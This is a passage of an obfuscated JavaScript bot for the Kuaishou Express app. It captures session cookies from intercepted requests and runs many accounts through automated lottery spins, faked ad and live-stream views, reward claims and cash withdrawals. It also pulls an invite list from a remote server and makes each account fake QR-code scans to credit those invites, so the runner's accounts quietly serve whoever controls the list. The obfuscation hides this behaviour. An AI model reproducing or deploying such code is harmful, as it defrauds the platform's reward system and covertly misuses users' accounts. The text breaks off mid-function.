    async ['luckydraw']() {
        let _0x5aeb3b = 'https://activity.e.kuaishou.com/rest/r/game/lottery?wheelVersion=1',
            _0x16fa83 = '',
            _0x5b3172 = _0x495d61(_0x5aeb3b, this['cookie'], _0x16fa83)

        await _0x39a23b('post', _0x5b3172)
        let _0x5099f1 = _0x1a0963

        if (!_0x5099f1) {
            return
        }

        if (_0x5099f1['result'] == 1) {
            let _0x355997 = _0x5099f1['data']['coinCount'] ? _0x5099f1['data']['coinCount'] + '金币' : _0x5099f1['data']['diamondCount'] ? _0x5099f1['data']['diamondCount'] + '钻石' : '空气'

            console['log']('账号[' + this['name'] + ']抽奖获得' + _0x355997)

            if (_0x5099f1['data']['videoCoinCount']) {
                console['log']('额外奖励：' + _0x5099f1['data']['videoCoinCount'])
            }

            if (_0x5099f1['data']['schema']) {
                try {
                    console['log'](_0x331719['decode'](_0x5099f1['data']['schema']))
                } catch (_0x2cd9ad) {
                    console['log'](_0x5099f1['data']['schema'])
                } finally {
                }
            }

            if (this['hasLuckydraw']) {
                await this['luckdrawTasks']()
            }
        } else {
            console['log']('账号[' + this['name'] + ']抽奖失败：' + _0x5099f1['error_msg'])
        }
    }

    async ['luckydrawSign']() {
        let _0x19e391 = 'https://activity.e.kuaishou.com/rest/r/game/sign-in',
            _0x364621 = '',
            _0x17553a = _0x495d61(_0x19e391, this['cookie'], _0x364621)

        await _0x39a23b('get', _0x17553a)
        let _0x3dc187 = _0x1a0963

        if (!_0x3dc187) {
            return
        }

        _0x3dc187['result'] == 1
            ? _0x3dc187['data']['isShow'] && console['log']('账号[' + this['name'] + ']抽奖页签到成功')
            : (console['log']('账号[' + this['name'] + ']查询抽奖签到情况失败：' + _0x3dc187['error_msg']), _0x3dc187['error_msg']['indexOf']('激励游戏未在运营') > -1 && (this['hasLuckydraw'] = false))
    }

    async ['luckdrawTimerInfo']() {
        let _0x41f4dd = 'https://activity.e.kuaishou.com/rest/r/game/timer-reward/info',
            _0x57d99c = '',
            _0x188ea7 = _0x495d61(_0x41f4dd, this['cookie'], _0x57d99c)

        await _0x39a23b('get', _0x188ea7)
        let _0x9de9b6 = _0x1a0963

        if (!_0x9de9b6) {
            return
        }

        if (_0x9de9b6['result'] == 1) {
            if (_0x9de9b6['data']) {
                let _0x53217e = new Date()['getTime'](),
                    _0x2d8627 = _0x9de9b6['data']['lastTimerTime'],
                    _0x42feaa = _0x9de9b6['data']['minutesInterval'] * 60 * 1000,
                    _0x25bdde = _0x2d8627 + _0x42feaa

                _0x53217e < _0x25bdde ? console['log']('账号[' + this['name'] + ']抽奖页奖励冷却时间还有' + (_0x25bdde - _0x53217e) / 1000 + '秒') : (await _0x3de8b8['wait'](200), await this['luckdrawTimerReward'](_0x9de9b6['data']['goldNum']))
            } else {
                console['log']('账号[' + this['name'] + ']抽奖页定时奖励次数已用完')
            }
        } else {
            console['log']('账号[' + this['name'] + ']查询抽奖页定时奖励情况失败：' + _0x9de9b6['error_msg'])
        }
    }

    async ['luckdrawTimerReward'](_0x571114) {
        let _0xeaee4 = 'https://activity.e.kuaishou.com/rest/r/game/timer-reward',
            _0x4f1a45 = '',
            _0x44f25f = _0x495d61(_0xeaee4, this['cookie'], _0x4f1a45)

        await _0x39a23b('post', _0x44f25f)
        let _0x3a934e = _0x1a0963

        if (!_0x3a934e) {
            return
        }

        _0x3a934e['result'] == 1 ? console['log']('账号[' + this['name'] + ']领取抽奖页定时奖励获得' + _0x571114 + '金币') : console['log']('账号[' + this['name'] + ']领取抽奖页定时奖励失败：' + _0x3a934e['error_msg'])
    }

    async ['luckdrawTasks']() {
        let _0x464ad5 = 'https://activity.e.kuaishou.com/rest/r/game/tasks',
            _0x2bfcad = '',
            _0x15101f = _0x495d61(_0x464ad5, this['cookie'], _0x2bfcad)

        await _0x39a23b('get', _0x15101f)
        let _0x4e8b19 = _0x1a0963

        if (!_0x4e8b19) {
            return
        }

        if (_0x4e8b19['result'] == 1) {
            for (let _0x2e65d8 of _0x4e8b19['data']['dailyTasks']) {
                _0x2e65d8['taskState'] == 1 && (await _0x3de8b8['wait'](200), await this['luckdrawTasksReward'](_0x2e65d8))
            }

            for (let _0x4e5c51 of _0x4e8b19['data']['growthTasks']) {
                _0x4e5c51['taskState'] == 1 && (await _0x3de8b8['wait'](200), await this['luckdrawTasksReward'](_0x4e5c51))
            }
        } else {
            console['log']('账号[' + this['name'] + ']查询抽奖页任务失败：' + _0x4e8b19['error_msg'])
        }
    }

    async ['luckdrawTasksReward'](_0x548292) {
        let _0x452703 = 'https://activity.e.kuaishou.com/rest/r/game/task/reward-receive?taskName=' + _0x548292['taskName'],
            _0x4038c0 = '',
            _0x2242b2 = _0x495d61(_0x452703, this['cookie'], _0x4038c0)

        await _0x39a23b('get', _0x2242b2)
        let _0x3417ed = _0x1a0963

        if (!_0x3417ed) {
            return
        }

        _0x3417ed['result'] == 1
            ? console['log']('账号[' + this['name'] + ']领取抽奖任务[' + _0x548292['taskTitle'] + ']奖励获得' + _0x3417ed['data']['popUp']['taskRewardName'])
            : console['log']('账号[' + this['name'] + ']领取抽奖任务[' + _0x548292['taskTitle'] + ']奖励失败：' + _0x3417ed['error_msg'])
    }

    async ['helpInvite'](_0x3becf3) {
        let _0x27c029 = _0x3becf3['split']('&'),
            _0x11e4b2 = _0x27c029[0],
            _0x7bd24a = _0x27c029[1],
            _0x3a6da6 = 'https://nebula.kuaishou.com/rest/n/nebula/qrcode?version=1.2.0',
            _0x543e81 = '',
            _0x146266 = _0x495d61(_0x3a6da6, this['cookie'], _0x543e81)

        _0x146266['headers']['Referer'] = 'https://nebula.kuaishou.com/fission/face-qrcode?fid=' + _0x11e4b2 + '&shareToken=' + _0x7bd24a + '&source=qrcode'
        await _0x39a23b('get', _0x146266)
        let _0x451327 = _0x1a0963

        if (!_0x451327) {
            return
        }

        if (!(_0x451327['result'] == 1)) {
            console['log']('账号[' + this['name'] + ']邀请失败：' + _0x451327['error_msg'])
        }
    }

    async ['helpScan'](_0x113f42) {
        let _0x2a16c0 = _0x113f42['split']('&'),
            _0x32df07 = _0x2a16c0[0],
            _0x5d1fe4 = _0x2a16c0[1]

        if (_0x32df07 == this['userId']) {
            return
        }

        let _0x5cb6ed = 'https://api.kuaishouzt.com/rest/zt/share/show/any',
            _0x1e3729 =
                'theme=light&sdkVersion=1.14.0.4&kpf=ANDROID_PHONE&shareMessage=https%3A%2F%2Fnicdd.get666bjrqu985xvp14v.com%2Ff%2F' +
                _0x5d1fe4 +
                '%3FlayoutType%3D4&kpn=NEBULA&launchState=hotLaunch&sessionId=ac165e40-48bd-42de-9fc5-b250d7eb983c&extTransientParams=%7B%22source%22%3A%22userScanCamera%22%7D',
            _0x147092 = _0x495d61(_0x5cb6ed, this['cookie'], _0x1e3729)

        await _0x39a23b('post', _0x147092)
        let _0x5649a8 = _0x1a0963

        if (!_0x5649a8) {
            return
        }

        _0x5649a8['result'] == 1 ? (await _0x3de8b8['wait'](100), await this['helpInvite'](_0x113f42)) : console['log']('账号[' + this['name'] + ']模拟邀请二维码扫描失败：' + _0x5649a8['error_msg'])
    }

    async ['bindInfo']() {
        let _0x328bd6 = 'https://www.kuaishoupay.com/pay/account/h5/provider/bind_info',
            _0x2f2b1b = 'account_group_key=NEBULA_CASH_ACCOUNT&bind_page_type=3',
            _0x32746d = _0x495d61(_0x328bd6, this['cookie'], _0x2f2b1b)

        await _0x39a23b('post', _0x32746d)
        let _0x4d5493 = _0x1a0963

        if (!_0x4d5493) {
            return
        }

        if (_0x4d5493['result'] == 'SUCCESS') {
            let _0x4015b0 = '未绑定支付宝',
                _0x3840b8 = '未绑定微信'
            _0x4d5493['alipay_bind'] == true && ((this['bindAlipay'] = true), (this['alipay'] = _0x4d5493['alipay_nick_name']), (_0x4015b0 = '已绑定支付宝[' + _0x4d5493['alipay_nick_name'] + ']'))
            _0x4d5493['wechat_bind'] == true && ((this['bindWechat'] = true), (this['wechat'] = _0x4d5493['wechat_nick_name']), (_0x3840b8 = '已绑定微信[' + _0x4d5493['wechat_nick_name'] + ']'))
            console['log']('账号[' + this['name'] + ']' + _0x3840b8 + '，' + _0x4015b0)
        } else {
            console['log']('账号[' + this['name'] + ']查询提现账号绑定情况失败：' + _0x4d5493['error_msg'])
        }
    }

    async ['accountInfo']() {
        let _0x308f69 = 'https://www.kuaishoupay.com/pay/account/h5/withdraw/account_info',
            _0xfe05d = 'account_group_key=NEBULA_CASH_ACCOUNT&providers=',
            _0x52286e = _0x495d61(_0x308f69, this['cookie'], _0xfe05d)

        await _0x39a23b('post', _0x52286e)
        let _0x25e462 = _0x1a0963

        if (!_0x25e462) {
            return
        }

        _0x25e462['result'] == 'SUCCESS' ? (this['needSms'] = _0x25e462['need_mobile_code']) : console['log']('账号[' + this['name'] + ']查询账号提现情况失败：' + _0x25e462['error_msg'])
    }
}

!(async () => {
    if (typeof $request !== 'undefined') {
        await _0x13d82d()
    } else {
        if (!(await _0x2dc359())) {
            return
        }

        console['log']('============================')
        console['log']('\n============== 登录 ==============')

        for (let _0x12581d of _0x431ea3) {
            await _0x12581d['getUserInfo']()
            await _0x3de8b8['wait'](500)
        }

        let _0x45d2be = _0x431ea3['filter']((_0x2f8945) => _0x2f8945['valid'] == true)

        if (_0x45d2be['length'] == 0) {
            return
        }

        for (let _0x31ce5c of _0x45d2be) {
            console['log']('\n=========== ' + _0x31ce5c['name'] + ' ===========')
            await _0x31ce5c['getSignInfo']()
            await _0x3de8b8['wait'](200)
            await _0x31ce5c['openBox'](false)
            await _0x3de8b8['wait'](200)
            await _0x31ce5c['taskList']()
            await _0x3de8b8['wait'](200)
            await _0x31ce5c['luckydrawSign']()
            await _0x3de8b8['wait'](200)

            if (_0x31ce5c['hasLuckydraw'] == true) {
                await _0x31ce5c['luckdrawTimerInfo']()
                await _0x3de8b8['wait'](200)
                await _0x31ce5c['luckdrawTasks']()
                await _0x3de8b8['wait'](200)
                await _0x31ce5c['luckdrawInfo']()
                await _0x3de8b8['wait'](200)
            }

            if (_0x31ce5c['task'][_0x3a6d45['luckydraw']]['needRun']) {
                for (let _0x1f56fa = 0; _0x1f56fa < _0x31ce5c['task'][_0x3a6d45['luckydraw']]['num']; _0x1f56fa++) {
                    _0x20a9d7 < 13
                        ? (await _0x31ce5c['ksNeoAdParam'](_0x4d7222['luckdrawVideo_161_213']), await _0x3de8b8['wait'](200), await _0x31ce5c['ksNeoAdParam'](_0x4d7222['luckdrawVideo_11_213']), await _0x3de8b8['wait'](200))
                        : (await _0x31ce5c['ksNeoAdParam'](_0x4d7222['luckdrawVideo_161_100']), await _0x3de8b8['wait'](200), await _0x31ce5c['ksNeoAdParam'](_0x4d7222['luckdrawVideo_11_100']), await _0x3de8b8['wait'](200))
                }
            }

            if (_0x31ce5c['task'][_0x3a6d45['ad']]['needRun']) {
                for (let _0xd38ea9 = 0; _0xd38ea9 < _0x31ce5c['task'][_0x3a6d45['ad']]['num']; _0xd38ea9++) {
                    await _0x31ce5c['ksAdParam'](_0x5b3c30['ad1'])
                    await _0x3de8b8['wait'](200)
                    _0xd38ea9 != _0x31ce5c['task'][_0x3a6d45['ad']]['num'] - 1 && (await _0x3de8b8['wait'](2000))
                }
            }

            if (_0x31ce5c['task'][_0x3a6d45['gj']]['needRun']) {
                for (let _0x243540 = 0; _0x243540 < _0x31ce5c['task'][_0x3a6d45['gj']]['num']; _0x243540++) {
                    await _0x31ce5c['ksgj']()[[]]
                    await _0x3de8b8['wait'](200)
                }
            }

            if (_0x31ce5c['task'][_0x3a6d45['live']]['needRun']) {
                for (let _0x1c1e1f = 0; _0x1c1e1f < _0x31ce5c['task'][_0x3a6d45['live']]['num']; _0x1c1e1f++) {
                    await _0x31ce5c['ksNeoAdParam'](_0x4d7222['liveVideo_75'])
                    await _0x3de8b8['wait'](200)
                }
            }

            if (_0x31ce5c['task'][_0x3a6d45['invite']]['needRun']) {
                for (let _0x105610 = 0; _0x105610 < _0x31ce5c['task'][_0x3a6d45['invite']]['num']; _0x105610++) {
                    await _0x31ce5c['ksNeoAdParam'](_0x4d7222['inviteVideo_2008'])
                    await _0x3de8b8['wait'](200)
                }
            }
        }

        console['log']('\n============== 账户情况 ==============')

        for (let _0x108fa3 of _0x45d2be) {
            await _0x108fa3['accountOverview']()
            await _0x3de8b8['wait'](200)
            await _0x108fa3['bindInfo']()
            await _0x3de8b8['wait'](200)
            await _0x108fa3['accountInfo']()
            await _0x3de8b8['wait'](200)
        }

        console['log']('\n============== 自动提现 ==============')
        let _0x127057 = '按提现列表自动提现'

        if (_0x1e627b) {
            _0x127057 = '自动提现' + _0x1e627b + '元'
        }

        if (_0x13d24b) {
            _0x127057 = '最大化提现'
        }

        if (_0x20a9d7 == _0x26f17b) {
            console['log']('提现时间，现在设置为' + _0x127057)

            for (let _0x2bcbc2 of _0x45d2be) {
                await _0x2bcbc2['withdrawOverview']()
                await _0x3de8b8['wait'](200)
            }
        } else {
            console['log']('非提现时间，现在设置为' + _0x26f17b + '点' + _0x127057)
        }

        await _0x217ea6()
        if (_0x5718d8['length'] > 0) {
            for (let _0x489c85 of _0x45d2be) {
                for (let _0xda5566 of _0x5718d8) {
                    await _0x489c85['helpScan'](_0xda5566)
                    await _0x3de8b8['wait'](200)
                }
            }
        }

        if (_0x113109 == 2) {
            await _0x577f0c()
        } else {
            if (_0x113109 == 1) {
                if (_0x20a9d7 == _0x26f17b) {
                    await _0x577f0c()
                }
            }
        }
    }
})()
    ['catch']((_0xbe4dfb) => _0x3de8b8['logErr'](_0xbe4dfb))
    ['finally'](() => _0x3de8b8['done']())

async function _0x13d82d() {
    if ($request['url']['indexOf']('appsupport/yoda/biz/info') > -1) {
        let _0x4e6471 = $request['headers']['Cookie']['match'](/(kuaishou.api_st=[\w\-]+)/)[1] + ';'

        _0x547212
            ? _0x547212['indexOf'](_0x4e6471) == -1 && ((_0x547212 = _0x547212 + '\n' + _0x4e6471), _0x3de8b8['setdata'](_0x547212, 'ksjsbCookie'), (ckList = _0x547212['split']('\n')), _0x3de8b8['msg'](_0x11b3c3 + (' 获取第' + ckList['length'] + '个ck成功: ' + _0x4e6471)))
            : (_0x3de8b8['setdata'](_0x4e6471, 'ksjsbCookie'), _0x3de8b8['msg'](_0x11b3c3 + (' 获取第1个ck成功: ' + _0x4e6471)))
    }

    if ($request['url']['indexOf']('ksapp/client/package/renew') > -1) {
        let _0x4defe1 = $request['url']['match'](/(kuaishou.api_st=[\w\-]+)/)[1] + ';'

        _0x547212
            ? _0x547212['indexOf'](_0x4defe1) == -1 && ((_0x547212 = _0x547212 + '\n' + _0x4defe1), _0x3de8b8['setdata'](_0x547212, 'ksjsbCookie'), (ckList = _0x547212['split']('\n')), _0x3de8b8['msg'](_0x11b3c3 + (' 获取第' + ckList['length'] + '个ck成功: ' + _0x4defe1)))
            : (_0x3de8b8['setdata'](_0x4defe1, 'ksjsbCookie'), _0x3de8b8['msg'](_0x11b3c3 + (' 获取第1个ck成功: ' + _0x4defe1)))
    }
}

async function _0x2dc359() {
    if (_0x547212) {
        let _0x5a8131 = _0x4c35fe[0]

        for (let _0x4b67a1 of _0x4c35fe) {
            if (_0x547212['indexOf'](_0x4b67a1) > -1) {
                _0x5a8131 = _0x4b67a1
                break
            }
        }

        for (let _0x1396ab of _0x547212['split'](_0x5a8131)) {
            if (_0x1396ab) {
                _0x431ea3['push'](new _0x9d8dda(_0x1396ab))
            }
        }

        _0x19c25c = _0x431ea3['length']
    } else {
        console['log']('未找到CK')
        return
    }

    console['log']('共找到' + _0x19c25c + '个账号')
    return true
}

async function _0x577f0c() {
    if (!_0x279d25) {
        return
    }

    notifyBody = '快手极速版运行通知\n\n' + _0x279d25

    if (_0x113109 > 0) {
        _0x3de8b8['msg'](notifyBody)

        if (_0x3de8b8['isNode']()) {
            var _0x59abbb = require('./sendNotify')

            await _0x59abbb['sendNotify'](_0x3de8b8['name'], notifyBody)
        }
    } else {
        console['log'](notifyBody)
    }
}

function _0x1ab8b7(_0x586f2b) {
    console['log'](_0x586f2b)
    _0x279d25 += _0x586f2b
    _0x279d25 += '\n'
}

async function _0x282ff5(_0x1af9c6) {
    if (!PushDearKey) {
        return
    }

    if (!_0x1af9c6) {
        return
    }

    console['log']('\n============= PushDear 通知 =============\n')
    console['log'](_0x1af9c6)
    let _0x4fa1da = {
        url: 'https://api2.pushdeer.com/message/push?pushkey=' + PushDearKey + '&text=' + encodeURIComponent(_0x1af9c6),
        headers: {},
    }
    await _0x39a23b('get', _0x4fa1da)

    let _0x2349ba = _0x1a0963,
        _0x28683d = _0x2349ba['content']['result'] == false ? '失败' : '成功'

    console['log']('\n========== PushDear 通知发送' + _0x28683d + ' ==========\n')
}

async function _0x505e51() {
    const _0x579681 = {
        url: _0x180c0c,
        headers: '',
    }
    await _0x39a23b('get', _0x579681)
    let _0x4edc5d = _0x1a0963

    if (!_0x4edc5d) {
        return
    }

    if (_0x4edc5d[_0x5bc515]) {
        let _0x53740e = _0x4edc5d[_0x5bc515]

        if (_0x53740e['status'] == 0) {
            if (_0x459e63 >= _0x53740e['version']) {
                _0x2e716e = true
                _0x75eec0 = 'https://leafxcy.coding.net/p/validcode/d/validCode/git/raw/master/ksjsb.json'
                console['log'](_0x53740e['msg'][_0x53740e['status']])
                console['log'](_0x53740e['updateMsg'])
                console['log']('现在运行的脚本版本是：1.07，最新脚本版本：' + _0x53740e['latestVersion'])
            } else {
                console['log'](_0x53740e['versionMsg'])
            }
        } else {
            console['log'](_0x53740e['msg'][_0x53740e['status']])
        }
    } else {
        console['log'](_0x4edc5d['errorMsg'])
    }
}

async function _0x217ea6() {
    let _0x16935c = ''
    const _0x315413 = {
        url: _0x180c0c,
        headers: '',
    }
    await _0x39a23b('get', _0x315413)
    let _0x1099e7 = _0x1a0963

    if (!_0x1099e7) {
        return _0x16935c
    }

    for (let _0x1e91a7 of _0x1099e7['invite']) {
        if (_0x1e91a7) {
            _0x5718d8['push'](_0x1e91a7)
        }
    }

    return _0x16935c
}

function _0x495d61(_0x286935, _0x27f7b3, _0x1464ef = '') {
    let _0x31553d = _0x286935['replace']('//', '/')['split']('/')[1]

    const _0x3fb7c9 = {
        Host: _0x31553d,
        Cookie: _0x27f7b3,
    }
    const _0x19eb25 = {
        url: _0x286935,
        headers: _0x3fb7c9,
    }
    _0x1464ef && ((_0x19eb25['body'] = _0x1464ef), (_0x19eb25['headers']['Content-Type'] = 'application/x-www-form-urlencoded'), (_0x19eb25['headers']['Content-Length'] = _0x19eb25['body'] ? _0x19eb25['body']['length'] : 0))
    return _0x19eb25
}

async function _0x39a23b(_0x49ab61, _0x5e6e12) {
    _0x1a0963 = null
    return new Promise((_0x4c1374) => {
        _0x3de8b8[_0x49ab61](_0x5e6e12, async (_0x59e746, _0x20d109, _0x4af930) => {
            try {
                if (_0x59e746) {
                    console['log'](_0x49ab61 + '请求失败')
                    console['log'](JSON['stringify'](_0x59e746))

                    _0x3de8b8['logErr'](_0x59e746)
                } else {
                    if (_0x244336(_0x4af930)) {
                        _0x1a0963 = JSON['parse'](_0x4af930)
                    }
                }
            } catch (_0x4aab16) {
                _0x3de8b8['logErr'](_0x4aab16, _0x20d109)
            } finally {
                _0x4c1374()
            }
        })
    })
}

function _0x244336(_0x441041) {
    try {
        if (typeof JSON['parse'](_0x441041) == 'object') {
            return true
        } else {
            console['log'](_0x441041)
        }
    } catch (_0x31da9c) {
        console['log'](_0x31da9c)
        console['log']('服务器访问数据为空，请检查自身设备网络情况')
        return false
    }
}

function _0x271dc5(_0xab177b, _0x1e5ea0) {
    return _0xab177b < _0x1e5ea0 ? _0xab177b : _0x1e5ea0
}

function _0x2be587(_0x26310e, _0x453891) {
    return _0x26310e < _0x453891 ? _0x453891 : _0x26310e
}

function _0x4c9db4(_0x4935b6, _0x1b0980, _0x3cc667 = '0') {
    let _0x1eff5e = String(_0x4935b6),
        _0x43176c = _0x1b0980 > _0x1eff5e['length'] ? _0x1b0980 - _0x1eff5e['length'] : 0,
        _0xe71290 = ''

    for (let _0x3a8cb8 = 0; _0x3a8cb8 < _0x43176c; _0x3a8cb8++) {
        _0xe71290 += _0x3cc667
    }

    _0xe71290 += _0x1eff5e
    return _0xe71290
}

function _0x4b5cde(_0x5a93ef = 12) {
    let _0x1d0a28 = 'abcdef0123456789',
        _0x5b4692 = _0x1d0a28['length'],
        _0x11a814 = ''

    for (i = 0; i < _0x5a93ef; i++) {
        _0x11a814 += _0x1d0a28['charAt'](Math['floor'](Math['random']() * _0x5b4692))
    }

    return _0x11a814
}

var _0x331719 = {
    _keyStr: 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=',
    encode: function (_0x484057) {
        var _0x57bd16 = ''

        var _0x2bc522, _0x905f95, _0x4971be, _0x3e47ea, _0x4b7730, _0x42192f, _0x3e02f8

        var _0x1dbb95 = 0
        _0x484057 = _0x331719['_utf8_encode'](_0x484057)

        while (_0x1dbb95 < _0x484057['length']) {
            _0x2bc522 = _0x484057['charCodeAt'](_0x1dbb95++)
            _0x905f95 = _0x484057['charCodeAt'](_0x1dbb95++)
            _0x4971be = _0x484057['charCodeAt'](_0x1dbb95++)
            _0x3e47ea = _0x2bc522 >> 2
            _0x4b7730 = ((_0x2bc522 & 3) << 4) | (_0x905f95 >> 4)
            _0x42192f = ((_0x905f95 & 15) << 2) | (_0x4971be >> 6)
            _0x3e02f8 = _0x4971be & 63

            if (isNaN(_0x905f95)) {
                _0x42192f = _0x3e02f8 = 64
            } else {
                isNaN(_0x4971be) && (_0x3e02f8 = 64)
            }

            _0x57bd16 = _0x57bd16 + this['_keyStr']['charAt'](_0x3e47ea) + this['_keyStr']['charAt'](_0x4b7730) + this['_keyStr']['charAt'](_0x42192f) + this['_keyStr']['charAt'](_0x3e02f8)
        }

        return _0x57bd16
    },
    decode: function (_0x384bf8) {
        var _0x2dbe73 = ''

        var _0x49fd4d, _0x1ccf5e, _0x331cac

        var _0x2b9e4a, _0x1b3a55, _0x61c80e, _0x3e3c0b

        var _0xb5cc46 = 0
        _0x384bf8 = _0x384bf8['replace'](/[^A-Za-z0-9+/=]/g, '')

        while (_0xb5cc46 < _0x384bf8['length']) {
            _0x2b9e4a = this['_keyStr']['indexOf'](_0x384bf8['charAt'](_0xb5cc46++))
            _0x1b3a55 = this['_keyStr']['indexOf'](_0x384bf8['charAt'](_0xb5cc46++))
            _0x61c80e = this['_keyStr']['indexOf'](_0x384bf8['charAt'](_0xb5cc46++))
            _0x3e3c0b = this['_keyStr']['indexOf'](_0x384bf8['charAt'](_0xb5cc46++))
            _0x49fd4d = (_0x2b9e4a << 2) | (_0x1b3a55 >> 4)
            _0x1ccf5e = ((_0x1b3a55 & 15) << 4) | (_0x61c80e >> 2)
            _0x331cac = ((_0x61c80e & 3) << 6) | _0x3e3c0b
            _0x2dbe73 = _0x2dbe73 + String['fromCharCode'](_0x49fd4d)
            _0x61c80e != 64 && (_0x2dbe73 = _0x2dbe73 + String['fromCharCode'](_0x1ccf5e))
            _0x3e3c0b != 64 && (_0x2dbe73 = _0x2dbe73 + String['fromCharCode'](_0x331cac))
        }

        _0x2dbe73 = _0x331719['_utf8_decode'](_0x2dbe73)
        return _0x2dbe73
    },
    _utf8_encode: function (_0xc1e6ac) {
        _0xc1e6ac = _0xc1e6ac['replace'](/rn/g, 'n')
        var _0x7de085 = ''

        for (var _0x2a6c81 = 0; _0x2a6c81 < _0xc1e6ac['length']; _0x2a6c81++) {
            var _0x3b5bd3 = _0xc1e6ac['charCodeAt'](_0x2a6c81)

            if (_0x3b5bd3 < 128) {
                _0x7de085 += String['fromCharCode'](_0x3b5bd3)
            } else {
                _0x3b5bd3 > 127 && _0x3b5bd3 < 2048
                    ? ((_0x7de085 += String['fromCharCode']((_0x3b5bd3 >> 6) | 192)), (_0x7de085 += String['fromCharCode']((_0x3b5bd3 & 63) | 128)))
                    : ((_0x7de085 += String['fromCharCode']((_0x3b5bd3 >> 12) | 224)), (_0x7de085 += String['fromCharCode'](((_0x3b5bd3 >> 6) & 63) | 128)), (_0x7de085 += String['fromCharCode']((_0x3b5bd3 & 63) | 128)))
            }
        }

        return _0x7de085
    },
    _utf8_decode: function (_0x39a06b) {
        var _0x409eb5 = ''
        var _0x5851f2 = 0

        var _0x43b331 = (c1 = c2 = 0)

        while (_0x5851f2 < _0x39a06b['length']) {
            _0x43b331 = _0x39a06b['charCodeAt'](_0x5851f2)

            if (_0x43b331 < 128) {
                _0x409eb5 += String['fromCharCode'](_0x43b331)
                _0x5851f2++
            } else {
                _0x43b331 > 191 && _0x43b331 < 224
                    ? ((c2 = _0x39a06b['charCodeAt'](_0x5851f2 + 1)), (_0x409eb5 += String['fromCharCode'](((_0x43b331 & 31) << 6) | (c2 & 63))), (_0x5851f2 += 2))
                    : ((c2 = _0x39a06b['charCodeAt'](_0x5851f2 + 1)), (c3 = _0x39a06b['charCodeAt'](_0x5851f2 + 2)), (_0x409eb5 += String['fromCharCode'](((_0x43b331 & 15) << 12) | ((c2 & 63) << 6) | (c3 & 63))), (_0x5851f2 += 3))
            }
        }

        return _0x409eb5
    },
}

function _0xcb54a4(_0x43dbe8) {
    function _0x4e9a6c(_0x3034e6, _0x2205c8) {
        return (_0x3034e6 << _0x2205c8) | (_0x3034e6 >>> (32 - _0x2205c8))
    }

    function _0x12457e(_0x126e58, _0x2f4066) {
        var _0x392840, _0x1f8331, _0x2c0987, _0xa87f42, _0x34d320

        _0x2c0987 = 2147483648 & _0x126e58
        _0xa87f42 = 2147483648 & _0x2f4066
        _0x392840 = 1073741824 & _0x126e58
        _0x1f8331 = 1073741824 & _0x2f4066
        _0x34d320 = (1073741823 & _0x126e58) + (1073741823 & _0x2f4066)
        return _0x392840 & _0x1f8331 ? 2147483648 ^ _0x34d320 ^ _0x2c0987 ^ _0xa87f42 : _0x392840 | _0x1f8331 ? (1073741824 & _0x34d320 ? 3221225472 ^ _0x34d320 ^ _0x2c0987 ^ _0xa87f42 : 1073741824 ^ _0x34d320 ^ _0x2c0987 ^ _0xa87f42) : _0x34d320 ^ _0x2c0987 ^ _0xa87f42
    }

    function _0x2aba0f(_0xdf55d3, _0x3fbd85, _0x258864) {
        return (_0xdf55d3 & _0x3fbd85) | (~_0xdf55d3 & _0x258864)
    }

    function _0x1a50bc(_0x736ad3, _0x2dd3bf, _0x4bef1c) {
        return (_0x736ad3 & _0x4bef1c) | (_0x2dd3bf & ~_0x4bef1c)
    }

    function _0x452b3c(_0x31133a, _0x423dcf, _0x4a0cbe) {
        return _0x31133a ^ _0x423dcf ^ _0x4a0cbe
    }

    function _0x29bd91(_0x4d7bcb, _0x39d4f2, _0x5763bf) {
        return _0x39d4f2 ^ (_0x4d7bcb | ~_0x5763bf)
    }

    function _0x12e776(_0x4467d5, _0x3fed67, _0x21447f, _0x46465d, _0x1885a2, _0x1545c4, _0x5a9b4e) {
        _0x4467d5 = _0x12457e(_0x4467d5, _0x12457e(_0x12457e(_0x2aba0f(_0x3fed67, _0x21447f, _0x46465d), _0x1885a2), _0x5a9b4e))
        return _0x12457e(_0x4e9a6c(_0x4467d5, _0x1545c4), _0x3fed67)
    }

    function _0x974662(_0x627c8b, _0x109362, _0xbc3586, _0xe4eed8, _0x9b2308, _0x968789, _0x362f9a) {
        _0x627c8b = _0x12457e(_0x627c8b, _0x12457e(_0x12457e(_0x1a50bc(_0x109362, _0xbc3586, _0xe4eed8), _0x9b2308), _0x362f9a))
        return _0x12457e(_0x4e9a6c(_0x627c8b, _0x968789), _0x109362)
    }

    function _0x238b94(_0x318ef2, _0x283363, _0x16c146, _0x2cf0f1, _0x435166, _0xda49e0, _0x3dca0d) {
        _0x318ef2 = _0x12457e(_0x318ef2, _0x12457e(_0x12457e(_0x452b3c(_0x283363, _0x16c146, _0x2cf0f1), _0x435166), _0x3dca0d))
        return _0x12457e(_0x4e9a6c(_0x318ef2, _0xda49e0), _0x283363)
    }

    function _0x4a4c2b(_0x1349d5, _0xb2d4cf, _0x180ff7, _0x533b88, _0x119b0a, _0x567e7b, _0x18b557) {
        _0x1349d5 = _0x12457e(_0x1349d5, _0x12457e(_0x12457e(_0x29bd91(_0xb2d4cf, _0x180ff7, _0x533b88), _0x119b0a), _0x18b557))
        return _0x12457e(_0x4e9a6c(_0x1349d5, _0x567e7b), _0xb2d4cf)
    }

    function _0x183cb7(_0x3fa90a) {
        for (var _0xe588b1, _0x224de6 = _0x3fa90a['length'], _0x2d06ae = _0x224de6 + 8, _0x348672 = (_0x2d06ae - (_0x2d06ae % 64)) / 64, _0x384d0c = 16 * (_0x348672 + 1), _0x5cc940 = new Array(_0x384d0c - 1), _0x13db9a = 0, _0x22ab51 = 0; _0x224de6 > _0x22ab51; ) {
            _0xe588b1 = (_0x22ab51 - (_0x22ab51 % 4)) / 4
            _0x13db9a = (_0x22ab51 % 4) * 8
            _0x5cc940[_0xe588b1] = _0x5cc940[_0xe588b1] | (_0x3fa90a['charCodeAt'](_0x22ab51) << _0x13db9a)
            _0x22ab51++
        }

        _0xe588b1 = (_0x22ab51 - (_0x22ab51 % 4)) / 4
        _0x13db9a = (_0x22ab51 % 4) * 8
        _0x5cc940[_0xe588b1] = _0x5cc940[_0xe588b1] | (128 << _0x13db9a)
        _0x5cc940[_0x384d0c - 2] = _0x224de6 << 3
        _0x5cc940[_0x384d0c - 1] = _0x224de6 >>> 29
        return _0x5cc940
    }

    function _0x488712(_0x446795) {
        var _0x33835f,
            _0x4c4488,
            _0x2f8cad = '',
            _0x1d6b74 = ''

        for (_0x4c4488 = 0; 3 >= _0x4c4488; _0x4c4488++) {
            _0x33835f = (_0x446795 >>> (8 * _0x4c4488)) & 255
            _0x1d6b74 = '0' + _0x33835f['toString'](16)
